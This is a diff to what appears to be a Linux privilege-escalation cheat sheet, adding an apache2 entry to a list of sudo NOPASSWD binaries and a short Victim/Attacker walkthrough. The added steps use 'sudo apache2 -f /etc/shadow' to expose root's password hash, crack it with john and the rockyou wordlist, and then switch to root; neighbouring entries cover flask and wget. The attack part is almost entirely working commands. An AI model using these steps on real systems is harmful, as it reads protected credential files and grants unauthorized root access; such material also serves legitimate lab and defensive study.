@@ -194,6 +194,7 @@ User www-data may run the following commands on <hostname>
 - (root) NOPASSWD: /usr/bin/anansi_util
 - (root) NOPASSWD: /usr/bin/apt-get
 - (root) NOPASSWD: /usr/bin/flask run
+- (root) NOPASSWD: /usr/bin/apache2
 - (root) NOPASSWD: /usr/bin/wget
 
 
@@ -320,6 +321,25 @@ export FLASK_APP=flask.py
 sudo /usr/bin/flask run
 ```
 
+apache2
+
+Victim
+```
+sudo apache2 -f /etc/shadow
+Copy root's hash
+```
+Attacker
+```
+echo '<root's_hash>' > hash
+john hash --wordlist=/usr/share/wordlists/rockyou.txt
+
+// Replace <root's_hash> with the hash that you copied 
+```
+Back to Victim
+```
+su root
+id && whoami
+```
 Wget
 
 Victim
